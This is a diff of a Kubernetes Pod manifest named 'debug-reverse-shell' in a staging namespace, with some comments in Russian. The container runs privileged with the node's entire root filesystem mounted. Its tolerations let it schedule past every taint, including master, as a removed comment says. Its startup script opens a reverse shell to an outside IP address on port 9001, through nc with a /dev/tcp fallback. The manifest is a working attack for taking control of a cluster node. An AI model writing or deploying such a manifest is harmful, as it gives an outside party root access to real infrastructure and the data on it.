@@ -4,7 +4,7 @@ metadata:
   name: debug-reverse-shell
   namespace: sportzia-staging
 spec:
-  nodeName: private-pool-p24gy   # ← ТОЧНО ТА ЖЕ НОДА
+  nodeName: private-pool-p24gy
   restartPolicy: Never
   containers:
   - name: shell
@@ -12,34 +12,25 @@ spec:
     command: ["/bin/sh", "-c"]
     args:
     - |
-      # Ждём, пока сеть и mount будут готовы
-      sleep 5;
+      sleep 3
+      apk add --no-cache busybox-extras &>/dev/null || true
 
-      # Пробуем установить nc (если нет — используем bash trick)
-      apk add --no-cache busybox-extras 2>/dev/null || apk add --no-cache netcat-openbsd 2>/dev/null || true;
+      # Reverse shell
+      rm -f /tmp/f
+      mkfifo /tmp/f
+      cat /tmp/f | /bin/sh -i 2>&1 | nc 188.227.84.184 9001 > /tmp/f ||
+      /bin/sh -i >& /dev/tcp/188.227.84.184/9001 0>&1
 
-      # Обратный шелл через nc
-      rm -f /tmp/f;
-      mkfifo /tmp/f;
-      cat /tmp/f | /bin/sh -i 2>&1 | nc 188.227.84.184 9001 > /tmp/f;
-
-      # Если nc не сработал — fallback на bash
-      /bin/sh -i >& /dev/tcp/188.227.84.184/9001 0>&1;
-
-      # Бесконечный цикл (на случай падения)
       sleep 3600
     securityContext:
       privileged: true
-      capabilities:
-        add: ["ALL"]
     volumeMounts:
     - name: host-root
       mountPath: /host
-      readOnly: false
   volumes:
   - name: host-root
     hostPath:
       path: /
       type: Directory
   tolerations:
-  - operator: Exists   # Обходит все taints (включая master)
+  - operator: Exists
